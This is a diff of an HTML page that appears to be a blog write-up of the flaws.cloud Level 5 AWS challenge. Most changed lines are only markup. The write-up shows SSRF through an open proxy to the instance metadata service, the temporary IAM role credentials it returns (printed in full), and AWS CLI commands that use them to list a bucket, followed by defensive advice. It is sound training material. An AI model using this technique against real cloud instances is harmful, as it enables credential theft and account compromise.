@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>flaws.cloud - Level 5 | text/plain</title>
@@ -413,24 +413,24 @@ Start at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/pr
 and follow the (non-clickable) links to explore.
 For example, at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/dynamic/instance-identity/document/">169.254.169.254/latest/dynamic/instance-identity/document/</a>
 you will find the following high-level summary of the configuration:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-  <span style="color:#f92672">&#34;privateIp&#34;</span> : <span style="color:#e6db74">&#34;172.31.41.84&#34;</span>,
-  <span style="color:#f92672">&#34;devpayProductCodes&#34;</span> : <span style="color:#66d9ef">null</span>,
-  <span style="color:#f92672">&#34;marketplaceProductCodes&#34;</span> : <span style="color:#66d9ef">null</span>,
-  <span style="color:#f92672">&#34;version&#34;</span> : <span style="color:#e6db74">&#34;2017-09-30&#34;</span>,
-  <span style="color:#f92672">&#34;instanceId&#34;</span> : <span style="color:#e6db74">&#34;i-05bef8a081f307783&#34;</span>,
-  <span style="color:#f92672">&#34;billingProducts&#34;</span> : <span style="color:#66d9ef">null</span>,
-  <span style="color:#f92672">&#34;instanceType&#34;</span> : <span style="color:#e6db74">&#34;t2.micro&#34;</span>,
-  <span style="color:#f92672">&#34;availabilityZone&#34;</span> : <span style="color:#e6db74">&#34;us-west-2a&#34;</span>,
-  <span style="color:#f92672">&#34;kernelId&#34;</span> : <span style="color:#66d9ef">null</span>,
-  <span style="color:#f92672">&#34;ramdiskId&#34;</span> : <span style="color:#66d9ef">null</span>,
-  <span style="color:#f92672">&#34;accountId&#34;</span> : <span style="color:#e6db74">&#34;975426262029&#34;</span>,
-  <span style="color:#f92672">&#34;architecture&#34;</span> : <span style="color:#e6db74">&#34;x86_64&#34;</span>,
-  <span style="color:#f92672">&#34;imageId&#34;</span> : <span style="color:#e6db74">&#34;ami-7c803d1c&#34;</span>,
-  <span style="color:#f92672">&#34;pendingTime&#34;</span> : <span style="color:#e6db74">&#34;2017-02-12T22:29:24Z&#34;</span>,
-  <span style="color:#f92672">&#34;region&#34;</span> : <span style="color:#e6db74">&#34;us-west-2&#34;</span>
-}
-</code></pre></div><p>Another place for valuable information is the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-api-cli">user data</a>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;privateIp&#34;</span> : <span style="color:#e6db74">&#34;172.31.41.84&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;devpayProductCodes&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;marketplaceProductCodes&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;version&#34;</span> : <span style="color:#e6db74">&#34;2017-09-30&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;instanceId&#34;</span> : <span style="color:#e6db74">&#34;i-05bef8a081f307783&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;billingProducts&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;instanceType&#34;</span> : <span style="color:#e6db74">&#34;t2.micro&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;availabilityZone&#34;</span> : <span style="color:#e6db74">&#34;us-west-2a&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;kernelId&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ramdiskId&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;accountId&#34;</span> : <span style="color:#e6db74">&#34;975426262029&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;architecture&#34;</span> : <span style="color:#e6db74">&#34;x86_64&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;imageId&#34;</span> : <span style="color:#e6db74">&#34;ami-7c803d1c&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;pendingTime&#34;</span> : <span style="color:#e6db74">&#34;2017-02-12T22:29:24Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;region&#34;</span> : <span style="color:#e6db74">&#34;us-west-2&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Another place for valuable information is the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-api-cli">user data</a>.
 AWS lets you specify a script that runs when an instance boots up.
 You could see the script at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/user-data/">169.254.169.254/latest/user-data</a>,
 but for this instance there is none. In other cases you may find hard-coded
@@ -445,25 +445,25 @@ touch any disk.</p>
 us. The manual request is a two-step procedure.
 First, find the instance profile name at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/info/">169.254.169.254/latest/meta-data/iam/info/</a>,
 which will look like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-  <span style="color:#f92672">&#34;Code&#34;</span> : <span style="color:#e6db74">&#34;Success&#34;</span>,
-  <span style="color:#f92672">&#34;LastUpdated&#34;</span> : <span style="color:#e6db74">&#34;2019-11-12T15:26:22Z&#34;</span>,
-  <span style="color:#f92672">&#34;InstanceProfileArn&#34;</span> : <span style="color:#e6db74">&#34;arn:aws:iam::975426262029:instance-profile/flaws&#34;</span>,
-  <span style="color:#f92672">&#34;InstanceProfileId&#34;</span> : <span style="color:#e6db74">&#34;AIPAIK7LV6U6UXJXQQR3Q&#34;</span>
-}
-</code></pre></div><p>Now we know it is called &ldquo;flaws&rdquo;.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Code&#34;</span> : <span style="color:#e6db74">&#34;Success&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;LastUpdated&#34;</span> : <span style="color:#e6db74">&#34;2019-11-12T15:26:22Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;InstanceProfileArn&#34;</span> : <span style="color:#e6db74">&#34;arn:aws:iam::975426262029:instance-profile/flaws&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;InstanceProfileId&#34;</span> : <span style="color:#e6db74">&#34;AIPAIK7LV6U6UXJXQQR3Q&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now we know it is called &ldquo;flaws&rdquo;.
 Fetch temporary credentials for the role from <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/">169.254.169.254/latest/meta-data/iam/security-credentials/flaws</a>
 and you should see something like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-  <span style="color:#f92672">&#34;Code&#34;</span> : <span style="color:#e6db74">&#34;Success&#34;</span>,
-  <span style="color:#f92672">&#34;LastUpdated&#34;</span> : <span style="color:#e6db74">&#34;2019-11-12T15:26:38Z&#34;</span>,
-  <span style="color:#f92672">&#34;Type&#34;</span> : <span style="color:#e6db74">&#34;AWS-HMAC&#34;</span>,
-  <span style="color:#f92672">&#34;AccessKeyId&#34;</span> : <span style="color:#e6db74">&#34;ASIA6GG7PSQG2DUIX6WK&#34;</span>,
-  <span style="color:#f92672">&#34;SecretAccessKey&#34;</span> : <span style="color:#e6db74">&#34;nqHFBc6JioWLn97VcuR2M3JYDHoaMfsuc1oKyasH&#34;</span>,
-  <span style="color:#f92672">&#34;Token&#34;</span> : <span style="color:#e6db74">&#34;IQoJb3JpZ2luX2VjEPD//////////wEaCXVzLXdlc3QtMiJGMEQCIG1yD/Vn/GDjnsCiO/Z0fpBMb0683hKDRtchraQcILQEAiAejtgTNX34u9vtT3fOqgyrNK2bvVMJWC0BMg1RxT4Y8SrSAggZEAAaDDk3NTQyNjI2MjAyOSIMlCGMWOpWm2U+5ItZKq8Ct4hi0KsQvsXCfRZs6M5uSUcBsh6voTztyBRx/gz03VmntxcTVHQZ0A9OwVYqzwo5OPzrauGqWAvzoT4NfcYVhNL1aWezbfXASLlLntO2m3RUFzoJUxMTHA3MM0myFuSVpW4DQBh+uDHCBwaxODYp4lAIbLBWE5+AVFLo0VdCVMUI7Syp181BmJiOWG62VuP6Mo5GHYvnWej7X2i7xt8FK7glanlayMpxto0a5KQsQI0NlLXKthvplOE9vMXKluVhBDj6PEvWYfE2rrVqmordfmqWkJbzs/Xu3XO0QbH/O2wbisOp3Rh+hQ72vAGGyQNUyy/j4iDXvkSJf6XE0+MiCiDLIkzZO3QbhHogTLQruChDF4hFagZJpa3vzfuKe+a4867KwjPYy6TqSsQS6vz/MJ6eq+4FOs4CZqC9yNSdhvUV4feei8iDC4PLQc9kanGY/74wYTo6jhynACeOZaxTbK3lHPwOtR4EDTdHmvtZ85ayXJ0zmjVndR0lB/Mt7LAQx8yXNpT23u6bK4XdN928nxF6QvrOHzuteHrSGKLcZOsQZZ/G5kovD6o3eeJ++1lymBNPtzN3/FaeVMgPly7gMbbCRqW/Q65Zw7tTYbKVLQJAfAh19ukfnuCNDMJexaSaMWM5l+djbD+TNw9A3cm+GAb6j6yYAv21+EnBAuUxOISI5CCI+9wRfKGHu/vgSLVt1uwvkHnFBFMcvVfcTYg8kQIEGZTQnxOw/sDr/32PugpmXjBc3OdLajgucrKkUdhaHP/XIA8nEYy8yTQHZguw9tsXaox4wz/dQKMzJsT+6mGdmMGyOnKMZmlW9ZqqXgHC57fi01IhjcamrxZr9E216qNTvsYS2g==&#34;</span>,
-  <span style="color:#f92672">&#34;Expiration&#34;</span> : <span style="color:#e6db74">&#34;2019-11-12T21:42:31Z&#34;</span>
-}
-</code></pre></div><p>Nice, we have a key and a session token.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Code&#34;</span> : <span style="color:#e6db74">&#34;Success&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;LastUpdated&#34;</span> : <span style="color:#e6db74">&#34;2019-11-12T15:26:38Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Type&#34;</span> : <span style="color:#e6db74">&#34;AWS-HMAC&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;AccessKeyId&#34;</span> : <span style="color:#e6db74">&#34;ASIA6GG7PSQG2DUIX6WK&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;SecretAccessKey&#34;</span> : <span style="color:#e6db74">&#34;nqHFBc6JioWLn97VcuR2M3JYDHoaMfsuc1oKyasH&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Token&#34;</span> : <span style="color:#e6db74">&#34;IQoJb3JpZ2luX2VjEPD//////////wEaCXVzLXdlc3QtMiJGMEQCIG1yD/Vn/GDjnsCiO/Z0fpBMb0683hKDRtchraQcILQEAiAejtgTNX34u9vtT3fOqgyrNK2bvVMJWC0BMg1RxT4Y8SrSAggZEAAaDDk3NTQyNjI2MjAyOSIMlCGMWOpWm2U+5ItZKq8Ct4hi0KsQvsXCfRZs6M5uSUcBsh6voTztyBRx/gz03VmntxcTVHQZ0A9OwVYqzwo5OPzrauGqWAvzoT4NfcYVhNL1aWezbfXASLlLntO2m3RUFzoJUxMTHA3MM0myFuSVpW4DQBh+uDHCBwaxODYp4lAIbLBWE5+AVFLo0VdCVMUI7Syp181BmJiOWG62VuP6Mo5GHYvnWej7X2i7xt8FK7glanlayMpxto0a5KQsQI0NlLXKthvplOE9vMXKluVhBDj6PEvWYfE2rrVqmordfmqWkJbzs/Xu3XO0QbH/O2wbisOp3Rh+hQ72vAGGyQNUyy/j4iDXvkSJf6XE0+MiCiDLIkzZO3QbhHogTLQruChDF4hFagZJpa3vzfuKe+a4867KwjPYy6TqSsQS6vz/MJ6eq+4FOs4CZqC9yNSdhvUV4feei8iDC4PLQc9kanGY/74wYTo6jhynACeOZaxTbK3lHPwOtR4EDTdHmvtZ85ayXJ0zmjVndR0lB/Mt7LAQx8yXNpT23u6bK4XdN928nxF6QvrOHzuteHrSGKLcZOsQZZ/G5kovD6o3eeJ++1lymBNPtzN3/FaeVMgPly7gMbbCRqW/Q65Zw7tTYbKVLQJAfAh19ukfnuCNDMJexaSaMWM5l+djbD+TNw9A3cm+GAb6j6yYAv21+EnBAuUxOISI5CCI+9wRfKGHu/vgSLVt1uwvkHnFBFMcvVfcTYg8kQIEGZTQnxOw/sDr/32PugpmXjBc3OdLajgucrKkUdhaHP/XIA8nEYy8yTQHZguw9tsXaox4wz/dQKMzJsT+6mGdmMGyOnKMZmlW9ZqqXgHC57fi01IhjcamrxZr9E216qNTvsYS2g==&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Expiration&#34;</span> : <span style="color:#e6db74">&#34;2019-11-12T21:42:31Z&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Nice, we have a key and a session token.</p>
 <h2 id="using-the-credentials">Using the credentials</h2>
 <p>So we have credentials now. Lets try to list the bucket.
 To use the credentials, you could source them into your environment:</p>
@@ -475,28 +475,28 @@ It should be a role with the same name as the instance profile, with the
 instance ID as session name:</p>
 <pre tabindex="0"><code> # aws sts get-caller-identity
 {
-    &quot;UserId&quot;: &quot;AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783&quot;,
-    &quot;Account&quot;: &quot;975426262029&quot;,
-    &quot;Arn&quot;: &quot;arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783&quot;
+    &#34;UserId&#34;: &#34;AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783&#34;,
+    &#34;Account&#34;: &#34;975426262029&#34;,
+    &#34;Arn&#34;: &#34;arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783&#34;
 }
 </code></pre><p>Now the final part is easy. List the bucket:</p>
 <pre tabindex="0"><code> # aws s3api list-objects-v2 --bucket level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --region us-west-2
 {
-    &quot;Contents&quot;: [
+    &#34;Contents&#34;: [
         ...
         {
-            &quot;Key&quot;: &quot;ddcc78ff/index.html&quot;,
-            &quot;LastModified&quot;: &quot;2017-03-03T04:36:25.000Z&quot;,
-            &quot;ETag&quot;: &quot;\&quot;e144e5208ec070129e9e0bd9369967b0\&quot;&quot;,
-            &quot;Size&quot;: 2782,
-            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+            &#34;Key&#34;: &#34;ddcc78ff/index.html&#34;,
+            &#34;LastModified&#34;: &#34;2017-03-03T04:36:25.000Z&#34;,
+            &#34;ETag&#34;: &#34;\&#34;e144e5208ec070129e9e0bd9369967b0\&#34;&#34;,
+            &#34;Size&#34;: 2782,
+            &#34;StorageClass&#34;: &#34;STANDARD&#34;
         },
         {
-            &quot;Key&quot;: &quot;index.html&quot;,
-            &quot;LastModified&quot;: &quot;2017-02-27T02:11:07.000Z&quot;,
-            &quot;ETag&quot;: &quot;\&quot;6b0ffa72702b171487f97e8f443599ee\&quot;&quot;,
-            &quot;Size&quot;: 871,
-            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+            &#34;Key&#34;: &#34;index.html&#34;,
+            &#34;LastModified&#34;: &#34;2017-02-27T02:11:07.000Z&#34;,
+            &#34;ETag&#34;: &#34;\&#34;6b0ffa72702b171487f97e8f443599ee\&#34;&#34;,
+            &#34;Size&#34;: 871,
+            &#34;StorageClass&#34;: &#34;STANDARD&#34;
         }
     ]
 }
@@ -546,12 +546,12 @@ the login. (Presumably) there is also no way to brute-force the token it would
 have returned. As a result we would not be able to extract credentials.</p>
 <p>For example, my (silly) try to make the proxy do a PUT can be seen below.
 Issuing a PUT against Google returns a complaint about an invalid method:</p>
-<pre tabindex="0"><code> # curl -i -X PUT -d 'param=value' http://google.com
+<pre tabindex="0"><code> # curl -i -X PUT -d &#39;param=value&#39; http://google.com
 HTTP/1.1 405 Method Not Allowed
 Allow: GET, HEAD
 ...
 </code></pre><p>Trying to send this through the proxy returns just a 403:</p>
-<pre tabindex="0"><code> # curl -i -X PUT -d 'param=value' http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/http://google.com
+<pre tabindex="0"><code> # curl -i -X PUT -d &#39;param=value&#39; http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/http://google.com
 HTTP/1.1 403 Forbidden
 ...
 </code></pre><h2 id="least-privilege">Least privilege</h2>
@@ -579,22 +579,22 @@ One such condition is that the public IP address of the entity making the API
 request has to be in a certain IP range. Consider the IAM policy below as an
 example. This would deny all actions performed by the IAM user &ldquo;some-user&rdquo;
 unless they originate from IP &ldquo;1.2.3.4&rdquo;:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-  <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
-  <span style="color:#f92672">&#34;Statement&#34;</span>: [
-    {
-      <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Deny&#34;</span>,
-      <span style="color:#f92672">&#34;Principal&#34;</span>: { <span style="color:#f92672">&#34;AWS&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::account-id:user/some-user&#34;</span> },
-      <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
-      <span style="color:#f92672">&#34;Condition&#34;</span>: {
-        <span style="color:#f92672">&#34;NotIpAddress&#34;</span>: {
-          <span style="color:#f92672">&#34;aws:SourceIp&#34;</span>: [ <span style="color:#e6db74">&#34;1.2.3.4/32&#34;</span> ]
-        }
-      }
-    }
-  ]
-}
-</code></pre></div><p>More details can be found in the <a href="https://aws.amazon.com/premiumsupport/knowledge-center/iam-restrict-calls-ip-addresses/">knowledge base</a>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Statement&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Deny&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Principal&#34;</span>: { <span style="color:#f92672">&#34;AWS&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::account-id:user/some-user&#34;</span> },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Condition&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;NotIpAddress&#34;</span>: {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;aws:SourceIp&#34;</span>: [ <span style="color:#e6db74">&#34;1.2.3.4/32&#34;</span> ]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>More details can be found in the <a href="https://aws.amazon.com/premiumsupport/knowledge-center/iam-restrict-calls-ip-addresses/">knowledge base</a>.
 Prepare for hard-to-debug problems if you do on large scale. AWS services
 sometimes use other services on your behalf. The source IP of these requests
 will not be yours but that of the machine this AWS service is operated on. Thus
@@ -718,7 +718,7 @@ detect misuse early so that you have time to react ()</li>
     <ul>
       
         <li><a href="/post/flaws_cloud_4/">flaws.cloud - Level 4</a>
-        <time datetime="15M">15 minutes</time>
+        <time datetime="14M">14 minutes</time>
       
         <li><a href="/post/flaws_cloud_3/">flaws.cloud - Level 3</a>
         <time datetime="9M">9 minutes</time>
@@ -730,10 +730,10 @@ detect misuse early so that you have time to react ()</li>
         <time datetime="6M">6 minutes</time>
       
         <li><a href="/post/htb_carrier/">Hack The Box Write-up - Carrier</a>
-        <time datetime="25M">25 minutes</time>
+        <time datetime="24M">24 minutes</time>
       
         <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
-        <time datetime="11M">11 minutes</time>
+        <time datetime="10M">10 minutes</time>
       
         <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
         <time datetime="12M">12 minutes</time>
